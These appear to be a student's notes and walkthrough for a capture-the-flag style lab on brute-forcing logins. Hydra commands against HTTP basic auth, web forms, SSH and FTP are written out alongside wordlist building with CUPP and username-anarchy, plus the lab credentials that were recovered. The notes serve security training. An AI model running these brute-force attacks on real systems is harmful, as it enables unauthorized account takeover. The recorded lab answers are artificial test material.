****## Basic HTTP Auth Brute Forcing

#### Default Passwords
```
## Default Passwords

areaeric@htb[/htb]$ hydra -h

areaeric@htb[/htb]$ hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 178.211.23.155 -s 31099 http-get /

## Questions
hydra -t 48 -C /opt/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 83.136.252.32 -s 53869 http-get /
```

#### Username Brute Force
```
## Wordlists
areaeric@htb[/htb]$ locate rockyou.txt

areaeric@htb[/htb]$ locate names.txt

## Username/Password Attack
Tip: We will add the "-u" flag, so that it tries all users on each password, instead of trying all 14 million passwords on one user, before moving on to the next.

areaeric@htb[/htb]$ hydra -L /opt/useful/SecLists/Usernames/Names/names.txt -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -u -f 178.35.49.134 -s 32901 http-get /

## Username Brute Force
areaeric@htb[/htb]$ hydra -L /opt/useful/SecLists/Usernames/Names/names.txt -p amormio -u -f 178.35.49.134 -s 32901 http-get /

## Questions
hydra -t 48 -L /opt/SecLists/Usernames/Names/names.txt -p admin -u -f 83.136.252.32 -s 53869 http-get /
```

## Web Forms Brute Forcing
#### Hydra Modules
```
## Brute Forcing Forms
- Try common login passwordslike admin:admin

areaeric@htb[/htb]$ hydra -h | grep "Supported services" | tr ":" "\n" | tr " " "\n" | column -e

- Identify type of login form (Get or Post)

areaeric@htb[/htb]$ hydra http-post-form -U

/login.php

/login.php:[user parameter]=^USER^&[password parameter]=^PASS^

/login.php:[user parameter]=^USER^&[password parameter]=^PASS^:[FAIL/SUCCESS]=[success/failed string]

## Fail/Success String
- Choose something highly unlikely on the login page.
e.g:
  <form name='login' autocomplete='off' class='form' action='' method='post'>

"/login.php:[user parameter]=^USER^&[password parameter]=^PASS^:F=<form name='login'"
```

#### Determine Login Parameters
```
## Using Browser
- [CTRL + SHIFT + E]
- Copy > Copy POST data

username=test&password=test

- Copy > Copy as cURL

areaeric@htb[/htb]$ curl 'http://178.128.40.63:31554/login.php' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://178.128.40.63:31554' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Referer: http://178.128.40.63:31554/login.php' -H 'Cookie: PHPSESSID=8iafr4t6c3s2nhkaj63df43v05' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-GPC: 1' --data-raw 'username=test&password=test'

## Using Burp Suite
- Capture request and take the part with data

username=admin&password=admin

"/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
```

#### Login Form Attacks
```
## Default Credentials
areaeric@htb[/htb]$ hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 178.35.49.134 -s 32901 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"

## Password Wordlist
areaeric@htb[/htb]$ hydra -l admin -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -f 178.35.49.134 -s 32901 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"

## Questions
- Use Burp: username=admin&password=admin

hydra -t 48 -l admin -P /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt -f 94.237.53.3 -s 39643 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
-> admin:password1
```

## Service Authentication Attacks
#### Personalized Wordlists
```
## CUPP
areaeric@htb[/htb]$ cupp -i

> First Name: William
> Surname: Gates
> Nickname: Bill
> Birthdate (DDMMYYYY): 28101955

> Partners) name: Melinda
> Partners) nickname: Ann
> Partners) birthdate (DDMMYYYY): 15081964

> Child's name: Jennifer
> Child's nickname: Jenn
> Child's birthdate (DDMMYYYY): 26041996

> Pet's name: Nila
> Company name: Microsoft

> Do you want to add some key words about the victim? Y/[N]: Phoebe,Rory
> Do you want to add special chars at the end of words? Y/[N]: y
> Do you want to add some random numbers at the end of words? Y/[N]:y
> Leet mode? (i.e. leet = 1337) Y/[N]: y

## Password Policy
- Identify password policy and remove corresponding words
sed -ri '/^.{,7}$/d' william.txt            # remove shorter than 8
sed -ri '/[!-/:-@\[-`\{-~]+/!d' william.txt # remove no special chars
sed -ri '/[0-9]+/!d' william.txt            # remove no numbers

## Mangling
- Creating permutation of different wordlist
- Using tools like rsmangler, The Mentalist

Tip: The more mangled a wordlist is, the more chances you have to hit a correct password, but it will take longer to brute force. So, always try to be efficient, and properly customize your wordlist using the intelligence you gathered.

## Custom Username Wordlist

areaeric@htb[/htb]$ git clone https://github.com/urbanadventurer/username-anarchy.git

./username-anarchy Bill Gates > bill.txt
```

#### Service Authentication Brute Forcing
```
## SSH Attack
areaeric@htb[/htb]$ hydra -L bill.txt -P william.txt -u -f ssh://178.35.49.134:22 -t 4

areaeric@htb[/htb]$ ssh b.gates@178.35.49.134 -p 22

b.gates@SERVER_IP's password: ********

b.gates@bruteforcing:~$ whoami

## FTP Brute Forcing
b.gates@bruteforcing:~$ ls /home

b.gates@bruteforcing:~$ netstat -antp | grep -i list

Note 1: Sometimes administrators test their security measures and policies with different tools. In this case, the administrator of this web server kept "hydra" installed. We can benefit from it and use it against the local system by attacking the FTP service locally or remotely.

Note 2: "rockyou-10.txt" can be found in "/opt/useful/SecLists/Passwords/Leaked-Databases/rockyou-10.txt", which contains 92 passwords in total. This is a shorter version of "rockyou.txt" which includes 14,344,391 passwords.

b.gates@bruteforcing:~$ hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1

b.gates@bruteforcing:~$ ftp 127.0.0.1

## Questions
- Follow directly from section to create wordlist for password
hydra -l b.gates -P william.txt -u -f ssh://83.136.252.32:41324 -t 4
-> b.gates:4dn1l3M!$

ssh b.gates@94.237.62.149 -p 41324

ls /home

hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1
-> m.gates:computer

ftp 127.0.0.1 
```

## Skills assessment

#### Skills Assessment- Website
```
Our customer requested an additional black box penetration test for another host on its network. After our host and port scans, we discovered just one single TCP port open. Since we've already found weak credentials on the other host, the new host may be vulnerable to the same vulnerability type. We should consider different wordlists as well during our engagement.

- access the page 83.136.252.32:58830
-> Requires basic authentication

## Attempt on basic authentication brute force
hydra -t 48 -C /opt/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 83.136.252.32 -s 58830 http-get /
-> Credential obtained, user:password

- Saw a login page, using a post form, attempt on web form brute force:

- Creating payload for hydra:
/admin_login.php

/admin_login.php:user=^USER^&pass=^PASS^

"/admin_login.php:user=^USER^&pass=^PASS^:F= <form name='log-in'"

## Attack on default credentials:
-> attack on default crdentials, attack on `admin`, `administrator`, `wpadmin`, `root`, `adm`, attack on reused username. 

- attack on default credentials
hydra -t 48 -C /opt/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 83.136.252.32 -s 58830 http-post-form "/admin_login.php:user=^USER^&pass=^PASS^:F=<form name='log-in'"
-> Failed

- Attack on admin password:
hydra -t 48 -l admin -P /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt -f 83.136.252.32 -s 58830 http-post-form "/admin_login.php:user=^USER^&pass=^PASS^:F=<form name='log-in'"
-> failed

- Attack on reuse username:
hydra -t 48 -l user -P /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt -f 83.136.252.32 -s 58830 http-post-form "/admin_login.php:user=^USER^&pass=^PASS^:F=<form name='log-in'"
-> Obtain credentials, user:harrypotter

-> Obtained Info:
# Welcome back Mr. Harry Potter!

## Please change your password, as it is very weak!

### You password must meet the company's Password Policy:

1. Must be 8 characters or longer
2. Must contain numbers
3. Must contain special characters
```

#### Skills assessment- Service Login
```
We are given the IP address of an online academy but have no further information about their website. As the first step of conducting a Penetration Testing engagement, we have to determine whether any weak credentials are used across the website and other login services.

Look beyond just default/common passwords. Use the skills learned in this module to gather information about employees we identified to create custom wordlists to attack their accounts.

Attack the web application and submit two flags using the skills we covered in the module sections and submit them to complete this module.

Q1:
As you now have the name of an employee from the previous skills assessment question, try to gather basic information about them, and generate a custom password wordlist that meets the password policy. Also use 'usernameGenerator' to generate potential usernames for the employee. Finally, try to brute force the SSH server shown above to get the flag.

## Attempt on service authentication attack chain:
-> First create wordlist and preparing for attack
cupp -i
> First Name: Harry
> Surname: Potter
> Nickname: 
> Birthdate (DDMMYYYY): 

rest blank, and 
> Do you want to add special chars at the end of words? Y/[N]: y
> Do you want to add some random numbers at the end of words? Y/[N]:y
> Leet mode? (i.e. leet = 1337) Y/[N]: y
-> Saved as harry.txt for passwordlist

- Fine tune password list:
sed -ri '/^.{,7}$/d' harry.txt           
sed -ri '/[!-/:-@\[-`\{-~]+/!d' harry.txt  
sed -ri '/[0-9]+/!d' harry.txt    

- Create username list
username-anarchy/username-anarchy Harry Potter > harry_usr.txt 

- Perform SSH attack:
hydra -L harry_usr.txt -P harry.txt -u -f ssh://83.136.254.223:47056 -t 4
-> Obtain credentials,: harry.potter:H4rry!!!

- Logging in
ssh harry.potter@83.136.254.223 -p 47056

## FTP Brute forcing
ls /home
-> Additional user is g.potter

netstat -antp | grep -i list
-> ftp service listenning on port 127.0.0.1:21

- Looking for appropriate password list:
ls 
-> reveals rockyou-30.txt

- Conditions for brute force set, attack on ftp:
hydra -t 48 -l g.potter -P rockyou-30.txt ftp://127.0.0.1
-> Obtain credentials, g.potter:harry

- Logging in ftp service
ftp 127.0.0.1
-> Enter username and password.
```




